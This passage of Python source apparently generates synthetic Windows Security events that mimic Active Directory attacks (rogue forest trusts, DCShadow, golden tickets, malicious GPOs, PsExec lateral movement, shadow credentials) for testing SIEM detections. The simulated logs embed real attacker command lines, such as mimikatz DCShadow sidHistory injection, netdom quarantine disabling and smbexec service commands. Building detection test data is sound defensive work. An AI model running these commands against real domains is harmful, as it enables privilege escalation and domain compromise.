        # TrustAttributes 0x8 = FOREST_TRANSITIVE; filtering disabled below is the danger.
        "TdoAttributes":       "0x8",
        "SidFilteringEnabled": "False",                 # quarantine OFF -> SID history crosses the trust
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   _get_domain(config),
        "SubjectLogonId":      logon_id or _new_logon_id(),
    }
    return _build_event(4706, dc_host, event_data, success=True, ts=ts)


def _build_4865(user_info, config, *, logon_id=None, ts=None) -> dict:
    """4865 – A trusted forest information entry was added (DC event)."""
    dc_host = _get_dc_hostname(config)
    event_data = {
        "ForestRoot":        _ROGUE_FOREST_DNS,
        "ForestRootSid":     _ROGUE_FOREST_SID,
        "OperationId":       f"0x{random.randint(0x10000, 0xfffff):x}",
        "EntryType":         "Top Level Name (TLN)",
        "Flags":             "0",                       # not excluded/disabled -> active TLN routing
        "TopLevelName":      _ROGUE_FOREST_DNS,
        "DnsName":           _ROGUE_FOREST_DNS,
        "NetbiosName":       _ROGUE_FOREST_NETBIOS,
        "DomainSid":         _ROGUE_FOREST_SID,
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": _get_domain(config),
        "SubjectLogonId":    logon_id or _new_logon_id(),
    }
    return _build_event(4865, dc_host, event_data, success=True, ts=ts)


def _build_4716(user_info, config, *, logon_id=None, ts=None,
                domain_netbios=_ROGUE_FOREST_NETBIOS, domain_sid=_ROGUE_FOREST_SID) -> dict:
    """4716 – Trusted domain information was modified (SID filtering disabled)."""
    dc_host = _get_dc_hostname(config)
    event_data = {
        "DomainName":          domain_netbios,
        "DomainSid":           domain_sid,
        "TdoAttributes":       "0x8",
        "SidFilteringEnabled": "False",
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   _get_domain(config),
        "SubjectLogonId":      logon_id or _new_logon_id(),
    }
    return _build_event(4716, dc_host, event_data, success=True, ts=ts)


def _build_4765(user_info, config, *, target_name, target_sid,
                source_sid, logon_id=None, ts=None) -> dict:
    """4765 – SID History was added to an account (cross-forest privilege injection)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":    target_name,
        "TargetDomainName":  domain,
        "TargetSid":         target_sid,
        "SourceUserName":    "Domain Admins",
        "SourceDomainName":  _ROGUE_FOREST_NETBIOS,
        "SourceSid":         source_sid,
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
    }
    return _build_event(4765, dc_host, event_data, success=True, ts=ts)


def _build_4928(user_info, config, *, source_addr, naming_context, logon_id=None, ts=None) -> dict:
    """4928 – An Active Directory replica source naming context was established (DCShadow push)."""
    dc_host = _get_dc_hostname(config)
    event_data = {
        "DestinationDRA":  dc_host,
        "SourceDRA":       source_addr,
        "SourceAddr":      source_addr,
        "NamingContext":   naming_context,
        "Options":         "0x40000000",   # DRS_WRIT_REP (writable replication)
        "SessionID":       f"0x{random.randint(0x100, 0xffff):x}",
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": _get_domain(config),
        "SubjectLogonId":    logon_id or _new_logon_id(),
    }
    return _build_event(4928, dc_host, event_data, success=True, ts=ts)


# A legitimate, long-standing partner forest (NOT the rogue one) — used by the existing-trust
# SID-filter-downgrade threat.
_PARTNER_NETBIOS = "CONTOSO"
_PARTNER_DNS     = "contoso.com"
_PARTNER_SID     = "S-1-5-21-" + "-".join(
    str(int(hashlib.sha256(("partner:" + str(i)).encode()).hexdigest(), 16) % 4000000000 + 1000000000)
    for i in range(3))


def _threat_existing_trust_sid_filter_downgrade(config, session_context):
    """SID-filter downgrade on an EXISTING legitimate trust (T1484.002 / T1134.005): rather than
    standing up a new rogue forest, the attacker disables SID filtering (quarantine) on a real,
    long-standing partner trust, then injects that forest's Domain-Admins SID into a controlled
    account — quieter than a brand-new trust. DC-originated Security events."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    events = []
    t = time.time()
    logon_id = _new_logon_id()
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"), logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2, auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id, elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id, is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)
    events.append(json.dumps(_build_4688(u, config,
                                         process_name="C:\\Windows\\System32\\netdom.exe",
                                         command_line=f'netdom trust {_get_dns_domain(config)} '
                                                      f'/Domain:{_PARTNER_DNS} /quarantine:No',
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)
    events.append(json.dumps(_build_4716(u, config, logon_id=logon_id, ts=t,
                                         domain_netbios=_PARTNER_NETBIOS, domain_sid=_PARTNER_SID)))
    t += random.uniform(1.0, 3.0)
    victim = _pick_windows_user(session_context) or u
    events.append(json.dumps(_build_4765(u, config, target_name=victim["username"],
                                         target_sid=_stable_user_sid(victim["username"]),
                                         source_sid=_PARTNER_SID + "-512", logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(u, config,
                                         process_name="C:\\Windows\\System32\\netdom.exe",
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_dcshadow(config, session_context):
    """DCShadow (T1207 Rogue Domain Controller): the attacker registers a fake DC in the directory
    and pushes malicious changes via replication, bypassing change auditing on real DCs.

    Sequence (DC-originated Security events):
      1. admin authenticates                    -> 4624 + 4672
      2. mimikatz lsadump::dcshadow              -> 4688
      3. attacker host registers as a DC (DRS SPNs + SERVER_TRUST_ACCOUNT) -> 4742
      4. nTDSDSA object created under Configuration (the rogue DC)         -> 5137
      5. replica source naming context established (the malicious push)    -> 4928  (primary signal)
      6. process exit                            -> 4689
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    dns_domain = _get_dns_domain(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))
    rogue_host = "WS-" + "".join(random.choice("ABCDEFGHJKMNPQRSTUVWXYZ23456789") for _ in range(6))
    rogue_fqdn = f"{rogue_host}.{dns_domain}"
    events = []
    t = time.time()
    logon_id = _new_logon_id()
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"), logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2, auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id, elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id, is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)
    events.append(json.dumps(_build_4688(u, config,
                                         process_name="C:\\Tools\\mimikatz.exe",
                                         command_line='mimikatz.exe "lsadump::dcshadow /object:'
                                                      'CN=Administrator,CN=Users,' + base_dn +
                                                      ' /attribute:sidHistory /value:S-1-5-21-...-519" "exit"',
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)
    # the attacker workstation registers itself as a DC (DRS SPNs + SERVER_TRUST_ACCOUNT UAC)
    drs_spns = (f"GC/{rogue_fqdn}/{dns_domain},"
                f"E3514235-4B06-11D1-AB04-00C04FC2DCD2/{uuid.uuid4()}/{dns_domain},"
                f"ldap/{rogue_fqdn}/{dns_domain}")
    events.append(json.dumps(_build_4742(u, config, target_computer_name=rogue_host + "$",
                                         target_sid=_stable_user_sid(rogue_host + "$"),
                                         sam_account_name=rogue_host + "$", dns_host_name=rogue_fqdn,
                                         spns=drs_spns, old_uac_value="0x1000", new_uac_value="0x2000",
                                         uac_control="%%2087",  # SERVER_TRUST_ACCOUNT
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 1.0)
    events.append(json.dumps(_build_5137(u, config,
                                         object_dn=f"CN={rogue_host},CN=Servers,CN=Default-First-Site-Name,"
                                                   f"CN=Sites,CN=Configuration,{base_dn}",
                                         object_class="nTDSDSA",
                                         object_guid=str(uuid.uuid4()), logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 1.0)
    events.append(json.dumps(_build_4928(u, config, source_addr=rogue_fqdn,
                                         naming_context=base_dn, logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(u, config, process_name="C:\\Tools\\mimikatz.exe",
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_golden_ticket(config, session_context):
    """Golden/forged-TGT usage (T1558.001): a controlled account presents service tickets with NO
    preceding TGT request (4768) and anomalous RC4 encryption — the hallmark of a forged ticket
    minted offline from the krbtgt hash. Burst of 4769 service-ticket requests, no 4768."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    events = []
    t = time.time()
    sensitive = ["cifs/DC01.{d}", "host/DC01.{d}", "ldap/DC01.{d}", "HTTP/sql-prod.{d}",
                 "MSSQLSvc/sql-prod.{d}:1433", "cifs/fileserver.{d}"]
    dns_domain = _get_dns_domain(config)
    for i, spn_t in enumerate(random.sample(sensitive, k=random.randint(4, 6))):
        spn = spn_t.format(d=dns_domain)
        # RC4 (0x17) where the realm normally issues AES — a forged-ticket indicator.
        events.append(json.dumps(_build_4769(u, config, service_spn=spn, encryption="0x17",
                                             status="0x0", ip_override=u.get("ip"),
                                             ts=t + i * random.uniform(0.3, 1.2))))
    return events


def _threat_malicious_gpo(config, session_context):
    """Malicious GPO modification (T1484.001 Group Policy Modification): an attacker edits a GPO to
    push a startup script / restricted-group change domain-wide, then links it to a privileged OU.

    Sequence: admin auth -> 4688 (GPO edit) -> 5136 gPCMachineExtensionNames/versionNumber ->
    5136 gPLink on the OU -> 4689."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    dns_domain = _get_dns_domain(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))
    gpo_guid = str(uuid.uuid4())
    gpo_dn = f"CN={{{gpo_guid}}},CN=Policies,CN=System,{base_dn}"
    events = []
    t = time.time()
    logon_id = _new_logon_id()
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"), logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2, auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id, elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id, is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)
    events.append(json.dumps(_build_4688(u, config,
                                         process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                         command_line='powershell.exe -c "Set-GPPrefRegistryValue -Name '
                                                      '\'Default Domain Policy\' -Context Computer -Action Update '
                                                      '-Key HKLM\\...\\Run -ValueName Updater -Value C:\\pkg\\u.exe"',
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)
    events.append(json.dumps(_build_5136(u, config, object_dn=gpo_dn, object_class="groupPolicyContainer",
                                         object_guid=gpo_guid, attribute_name="gPCMachineExtensionNames",
                                         attribute_value="[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}]",
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.6)
    events.append(json.dumps(_build_5136(u, config,
                                         object_dn=f"OU=Domain Controllers,{base_dn}", object_class="organizationalUnit",
                                         object_guid=str(uuid.uuid4()), attribute_name="gPLink",
                                         attribute_value=f"[LDAP://{gpo_dn};0]", logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(u, config,
                                         process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_rogue_forest_trust(config, session_context):
    """Rogue forest trust + SID-history injection (ATT&CK T1484.002 Domain Trust Modification,
    T1134.005 SID-History Injection). A compromised admin on a DC establishes a two-way forest
    trust to an attacker-controlled forest with SID filtering disabled, then injects the rogue
    forest's Domain-Admins SID into a controlled account so it is privileged across the trust.

    Sequence (all DC-originated Security events):
      1. admin authenticates to the DC          -> 4624 + 4672
      2. netdom/PowerShell trust creation        -> 4688
      3. new trust created to the rogue domain   -> 4706   (primary signal)
      4. trusted forest information entry added   -> 4865   (TLN routing to the rogue forest)
      5. trusted domain info modified, SID filtering disabled -> 4716 (the dangerous misconfig)
      6. SID History injected into a controlled account       -> 4765 (cross-forest privesc)
      7. process exit                             -> 4689
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    events = []
    t = time.time()
    logon_id = _new_logon_id()
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2, auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id, elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id, is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)
    tool = random.choice([
        ("C:\\Windows\\System32\\netdom.exe",
         f'netdom trust {_get_dns_domain(config)} /Domain:{_ROGUE_FOREST_DNS} '
         f'/add /twoway /transitive:yes /quarantine:No'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "$f=[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); '
         f'$f.CreateTrustRelationship(\'{_ROGUE_FOREST_DNS}\',\'Bidirectional\')"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1], logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)
    events.append(json.dumps(_build_4706(u, config, logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.8)
    events.append(json.dumps(_build_4865(u, config, logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.8)
    events.append(json.dumps(_build_4716(u, config, logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)
    # Inject the rogue forest's Domain-Admins SID into a controlled account (SID history).
    victim = _pick_windows_user(session_context) or u
    events.append(json.dumps(_build_4765(u, config,
                                         target_name=victim["username"],
                                         target_sid=_stable_user_sid(victim["username"]),
                                         source_sid=_ROGUE_FOREST_SID + "-512",
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# ── Remote execution / persistence over SMB (5140 / 5145 / 4698 / 4697 + 7045) ──
# No Cortex "Windows Event Collector" analytic keys on these EventIDs (checked
# 2026-10-19), so they are background-only here; surfacing them needs correlation
# rules (not yet written). Each chain is the server-side record of a real tool run.

def _remote_logon(attacker, config, target_host, src_ip, t, auth_pkg=_NTLM_PACKAGE_SHORT):
    """Network logon of the operator onto target_host (4624 type 3 + 4672).
    Returns (events, logon_id)."""
    lid = _new_logon_id()
    on_target = {**attacker, "hostname": target_host}
    ev = _build_4624(attacker, config, logon_type=3, auth_pkg=auth_pkg,
                     workstation_override=target_host, ip_override=src_ip,
                     target_logon_id=lid, elevated=True, ts=t)
    return [json.dumps(ev),
            json.dumps(_build_4672(on_target, config, logon_id=lid, is_admin=True,
                                   ts=t + 0.02))], lid


def _peer_windows_users(session_context, exclude_username, need=3):
    """Windows users OTHER than `exclude_username`, as victims of an actor's threat.

    From the run's session_context; when that holds too few -- Bad User hands each
    module a context with only the target in it -- from the full roster, so the target
    can still be the actor of a threat that needs other accounts (roasting, lockouts,
    adding someone to an admin group)."""
    peers = [u for u in _get_windows_users(session_context) if u["username"] != exclude_username]
    if len(peers) >= need:
        return peers
    try:
        from modules.session_utils import roster_context
    except ImportError:
        from session_utils import roster_context
    full = roster_context()
    return [u for u in _get_windows_users(full) if u["username"] != exclude_username] or peers


def _lateral_pair(session_context):
    """(operator, target_host) -- the operator's own box is the source. One user is
    enough (Bad User): the fixed file/app servers below are always valid targets."""
    users = _get_windows_users(session_context)
    if not users:
        return None, None
    op = random.choice(users)
    targets = [u["hostname"] for u in users if u["hostname"] != op["hostname"]]
    targets += ["FS01", "FS02", "SQL01", "APP01"]
    return op, random.choice(targets)


def _threat_psexec_lateral(config, session_context):
    """PsExec / Impacket smbexec remote service execution on a peer host.

    Server-side trail: type-3 admin logon, ADMIN$ / IPC$ share connects (5140), the
    service binary write and svcctl pipe (5145), the service install (4697 + 7045),
    then the named-pipe I/O (PsExec) or the C$ output file (smbexec)."""
    op, target = _lateral_pair(session_context)
    if not op:
        return None
    src_ip = op.get("ip") or "10.10.20.50"
    src_short = op["hostname"].split(".")[0].upper()
    t = time.time()
    events, lid = _remote_logon(op, config, target, src_ip, t)
    t += random.uniform(0.2, 0.6)
    kw = dict(ip=src_ip, logon_id=lid)
    events.append(json.dumps(_build_5140(op, config, computer=target, share_name=r"\\*\IPC$",
                                         share_path="", ts=t, **kw)))
    if random.random() < 0.6:
        # Sysinternals PsExec
        svc, image = "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe"
        t += 0.1
        events.append(json.dumps(_build_5140(op, config, computer=target, share_name=r"\\*\ADMIN$",
                                             share_path=r"\??\C:\Windows", ts=t, **kw)))
        events.append(json.dumps(_build_5145(op, config, computer=target, share_name=r"\\*\ADMIN$",
                                             share_path=r"\??\C:\Windows", relative_target="PSEXESVC.exe",
                                             access=_5145_WRITE, ts=t + 0.05, **kw)))
        cli_pid = random.randint(1000, 30000)     # the PsExec client's PID names all three
        pipes = ["svcctl"] + [f"PSEXESVC-{src_short}-{cli_pid}-{s}"
                              for s in ("stdin", "stdout", "stderr")]
        child = (r"C:\Windows\System32\cmd.exe", "cmd.exe", r"C:\Windows\PSEXESVC.exe")
    else:
        # Impacket smbexec: the service IS the command, output lands on C$.
        svc = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=random.choice([6, 8])))
        image = (r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > "
                 r"%SYSTEMROOT%\execute.bat & %COMSPEC% /Q /c %SYSTEMROOT%\execute.bat & "
                 r"del %SYSTEMROOT%\execute.bat")
        pipes = ["svcctl"]
        child = (r"C:\Windows\System32\cmd.exe", image.replace("%COMSPEC%", "cmd.exe"),
                 r"C:\Windows\System32\services.exe")
    t += 0.3
    events.append(json.dumps(_build_5145(op, config, computer=target, share_name=r"\\*\IPC$",
                                         share_path="", relative_target=pipes[0],
                                         access=_5145_PIPE, ts=t, **kw)))
    t += 0.2
    events.append(json.dumps(_build_4697(config, computer=target, service_name=svc,
                                         service_file=image, start_type=3, ts=t)))
    events.append(json.dumps(_build_7045(config, computer=target, service_name=svc,
                                         image_path=image, start_type=3,
                                         installer_sid=_stable_user_sid(op["username"]),
                                         ts=t + 0.01)))
    t += 0.4
    events.append(json.dumps(_build_4688({**op, "hostname": target}, config,
                                         process_name=child[0], command_line=child[1],
                                         parent_process=child[2], ts=t)))
    for p in pipes[1:]:
        t += 0.05
        events.append(json.dumps(_build_5145(op, config, computer=target, share_name=r"\\*\IPC$",
                                             share_path="", relative_target=p,
                                             access=_5145_PIPE, ts=t, **kw)))
    if svc != "PSEXESVC":
        t += random.uniform(0.5, 2.0)
        # Windows logs the C$ root as \??\C:\ -- one trailing backslash. Not a raw
        # string: r"...\" cannot end in a single backslash, and r"...\\" keeps two.
        c_root = "\\??\\C:\\"
        events.append(json.dumps(_build_5140(op, config, computer=target, share_name=r"\\*\C$",
                                             share_path=c_root, ts=t, **kw)))
        events.append(json.dumps(_build_5145(op, config, computer=target, share_name=r"\\*\C$",
                                             share_path=c_root, relative_target="__output",
                                             ts=t + 0.05, **kw)))
    return events


_ATEXEC_COMMANDS = [
    "whoami /all", "net group \"Domain Admins\" /domain", "ipconfig /all",
    "tasklist /v", "quser", "net localgroup administrators",
]


def _threat_remote_scheduled_task(config, session_context):
    """Impacket atexec / schtasks /S: a hidden SYSTEM task registered over the atsvc
    pipe, run once, its output read back over ADMIN$, then the task deleted."""
    op, target = _lateral_pair(session_context)
    if not op:
        return None
    src_ip = op.get("ip") or "10.10.20.50"
    t = time.time()
    events, lid = _remote_logon(op, config, target, src_ip, t)
    kw = dict(ip=src_ip, logon_id=lid)
    t += 0.3
    events.append(json.dumps(_build_5140(op, config, computer=target, share_name=r"\\*\IPC$",
                                         share_path="", ts=t, **kw)))
    events.append(json.dumps(_build_5145(op, config, computer=target, share_name=r"\\*\IPC$",
                                         share_path="", relative_target="atsvc",
                                         access=_5145_PIPE, ts=t + 0.05, **kw)))
    tname = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8))
    tmp = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8)) + ".tmp"
    args = f"/C {random.choice(_ATEXEC_COMMANDS)} > %windir%\\Temp\\{tmp} 2>&1"
    t += 0.3
    task = _build_4698(op, config, computer=target, task_name="\\" + tname,
                       command="cmd.exe", arguments=args, run_as="S-1-5-18",
                       hidden=True, trigger="once", logon_id=lid, ts=t)
    events.append(json.dumps(task))
    t += random.uniform(1.5, 4.0)
    events.append(json.dumps(_build_4688({**op, "hostname": target}, config,
                                         process_name=r"C:\Windows\System32\cmd.exe",
                                         command_line=f"cmd.exe {args}",
                                         parent_process=r"C:\Windows\System32\svchost.exe",
                                         ts=t)))
    t += random.uniform(0.5, 1.5)
    deleted = _build_event(4699, _fqdn(target, config),
                           {k: task["event_data"][k] for k in
                            ("SubjectUserSid", "SubjectUserName", "SubjectDomainName",
                             "SubjectLogonId", "TaskName", "TaskContent",
                             "ClientProcessStartKey", "ClientProcessId", "ParentProcessId",
                             "RpcCallClientLocality", "FQDN")}, ts=t)
    events.append(json.dumps(deleted))
    t += 0.4
    events.append(json.dumps(_build_5140(op, config, computer=target, share_name=r"\\*\ADMIN$",
                                         share_path=r"\??\C:\Windows", ts=t, **kw)))
    events.append(json.dumps(_build_5145(op, config, computer=target, share_name=r"\\*\ADMIN$",
                                         share_path=r"\??\C:\Windows",
                                         relative_target=f"Temp\\{tmp}", ts=t + 0.05, **kw)))
    return events


def _threat_share_enumeration(config, session_context):
    """SMB share discovery sweep (SharpShares / PowerView Find-DomainShare /
    CrackMapExec --shares): one source connects IPC$ and calls srvsvc
    NetShareEnum on many hosts within a minute or two."""
    users = _get_windows_users(session_context)
    if not users:
        return None
    op = random.choice(users)
    src_ip = op.get("ip") or "10.10.20.50"
    hosts = list({u["hostname"] for u in _peer_windows_users(session_context, op["username"])
                  if u["hostname"] != op["hostname"]})
    hosts += ["FS01", "FS02", "SQL01", "APP01", "BACKUP01"]
    random.shuffle(hosts)
    t = time.time()
    events = []
    for host in hosts[:random.randint(8, 15)]:
        evs, lid = _remote_logon(op, config, host, src_ip, t, auth_pkg=_KRB_PACKAGE)
        events.append(evs[0])           # plain user: 4624 only, no 4672
        kw = dict(ip=src_ip, logon_id=lid)
        events.append(json.dumps(_build_5140(op, config, computer=host, share_name=r"\\*\IPC$",
                                             share_path="", ts=t + 0.05, **kw)))
        events.append(json.dumps(_build_5145(op, config, computer=host, share_name=r"\\*\IPC$",
                                             share_path="", relative_target="srvsvc",
                                             access=_5145_PIPE, ts=t + 0.1, **kw)))
        t += random.uniform(1.0, 8.0)
    return events


def _threat_malicious_service_install(config, session_context):
    """Local service persistence: an implant registered as an auto-start service
    from a user-writable path (4697 + 7045)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    name = random.choice(_IMPLANT_SERVICE_NAMES)
    image = random.choice(_IMPLANT_SERVICE_FILES).replace("{n}", name)
    t = time.time()
    return [json.dumps(_build_4697(config, computer=u["hostname"], service_name=name,
                                   service_file=image, start_type=2, ts=t)),
            json.dumps(_build_7045(config, computer=u["hostname"], service_name=name,
                                   image_path=image, start_type=2, ts=t + 0.01))]


# --- AD CS / Kerberos relay / directory-attribute abuse ---------------------
#
# The seven generators below close the Windows Event Collector Low+ gaps that
# had no producer: shadow credentials, PKINIT, SID-history injection, ADFS DKM
# key access, Kerberos relay, machine-account SPN clearing and a suspicious
# sAMAccountName rename.
#
# Which event actually reaches the XSIAM analytics is only partly documented.
# The published analytic pages name the *signal* ("a user modified the
# msDS-KeyCredentialLink attribute", "a user added SID history") but not the
# Event ID or EventData fields, and 5136 may not reach the analytics intake while
# 4662 does (the dMSA detector consumes 4662). Every attribute-change generator here
# therefore emits BOTH:
#   * 5136 old -> new pairs (the native AD audit record, kept for realism), and
#   * 4662 Write Property (0x20) on the object naming the attribute schema GUID
#     (the shape the dMSA/dcsync detectors consume), plus
#   * the final-state 4738/4742 where Windows has a field for the attribute.
# Attribute schema GUIDs below are the published System-Id-Guid values from
# Microsoft Learn's AD schema pages (fetched 2026-11-01), not guesses.
_GUID_CLASS_USER              = "%{bf967aba-0de6-11d0-a285-00aa003049e2}"
_GUID_CLASS_COMPUTER          = "%{bf967a86-0de6-11d0-a285-00aa003049e2}"
_GUID_ATTR_KEY_CREDENTIAL     = "{5b47d60f-6090-40b2-9f37-2a4de88f3063}"
_GUID_ATTR_SID_HISTORY        = "{17eb4278-d167-11d0-b002-0000f80367c1}"
_GUID_ATTR_SERVICE_PRINCIPAL  = "{f3a64788-5306-11d1-a9c5-0000f80367c1}"
_GUID_ATTR_SAM_ACCOUNT_NAME   = "{3e0abfd0-126a-11d0-a060-00aa006c33ed}"
_GUID_ATTR_THUMBNAIL_PHOTO    = "{8d3bca50-1d7e-11d0-a081-00aa006c33ed}"

# PA-PK-AS-REQ. Windows records this as PreAuthType=16 on a PKINIT 4768; 2 is
# PA-ENC-TIMESTAMP (password), the value every non-PKINIT generator uses.
_PREAUTH_PKINIT = "16"


def _pkinit_cert_fields(config, *, rogue=False):
    """(CertIssuerName, CertSerialNumber, CertThumbprint) for a PKINIT 4768.

    Field names are the published 4768 EventData names. The issuer is either the
    simulated enterprise CA or, for the suspicious variant, an issuer outside
    the organisation's PKI. The shape is built from the published field names, not a
    captured PKINIT 4768; diff against a genuine event if the detector stays silent.
    """
    base = _domain_dn(config)
    if rogue:
        issuer = f"CN=ROGUE-CA,{base}"
    else:
        ca_short = _get_ca_hostname(config).split(".")[0].upper()
        issuer = f"CN={ca_short}-Enterprise-CA,{base}"
    return (issuer,
            "%032X" % random.getrandbits(128),
            "%040X" % random.getrandbits(160))


def _pick_other_windows_user(session_context, actor):
    """A Windows user other than `actor`, or None when the estate has only one."""
    others = [x for x in _get_windows_users(session_context)
              if x["username"] != actor["username"]]
    return random.choice(others) if others else None


def _attr_change_4662(actor, config, *, object_class, object_dn, attr_guid,
                      logon_id=None, ts=None):
    """4662 Write Property on an AD object naming one attribute schema GUID.

    This is the corroborating shape the dMSA succession and DCSync detectors are
    proven to read. AccessMask 0x20 is Write Property; ObjectType is the class
    of the object written to; Properties carries the attribute GUID.
    """
    return _build_4662(actor, config,
                       object_type=object_class,
                       object_name=object_dn,
                       access_mask="0x20",
                       properties=f"{attr_guid}\n",
                       operation_type="Object Access",
                       logon_id=logon_id, ts=ts)


def _threat_shadow_credentials(config, session_context):
    """Shadow Credentials: write msDS-KeyCredentialLink on an account, then
    authenticate as it with PKINIT.

    XSIAM analytics targeted:
      - "Key credential attribute modification" (Informational)
        variations "Possible shadow credentials addition" (Medium) and
        "Key credential attribute addition" (Low)
      - the follow-on PKINIT TGT also feeds "PKINIT TGT authentication request"

    Both the 5136 Value Added pair and the 4662 Write Property are emitted, plus
    a PKINIT 4768 for the modified identity. The Medium "Possible shadow
    credentials addition" variation is selected by the AttributeValue's declared
    DN-Binary length: `B:828:` selects Medium, other lengths the Low "Key
    credential attribute addition" variation; the target account type (user vs
    computer) does not. The generator therefore emits a realistic
    828-hex-character KEY_CREDENTIAL blob, the length a genuine value has.

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 Whisker / Certipy / PowerShell Add-KeyCredentialLink
      3. 5136 msDS-KeyCredentialLink Value Added on the target
      4. 4662 Write Property on the target (key-credential schema GUID)
      5. 4768 PKINIT TGT for the target (PreAuthType 16, certificate fields)
      6. 4769 service ticket for the target
      7. 4689 process exit
    """
    actor = _pick_windows_user(session_context)
    if not actor:
        return None

    dns_domain = _get_dns_domain(config)
    base_dn = _domain_dn(config)

    # The realistic Whisker/Certipy target is a computer, so the target is a
    # machine account rather than a second user. (The account type does not
    # select the analytic variation; the key-credential length below does.)
    computer_name = (random.choice(["BACKUP", "FILE", "APP", "SQL", "WEB"])
                     + str(random.randint(10, 99)))
    computer_sam = f"{computer_name}$"
    target = {
        "username": computer_sam,
        "hostname": f"{computer_name.lower()}.{dns_domain}",
        "ip": actor.get("ip"),
    }
    target_dn = f"CN={computer_name},CN=Computers,{base_dn}"
    target_guid = _new_logon_guid()
    target_sid = _stable_user_sid(computer_name)

    events = []
    t = time.time()
    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(actor, config,
                                             ip_override=actor.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(actor, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(actor, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Users\\Public\\Whisker.exe",
         f"Whisker.exe add /target:{target['username']} /domain:{dns_domain} "
         f"/dc:{_get_dc_hostname(config)}"),
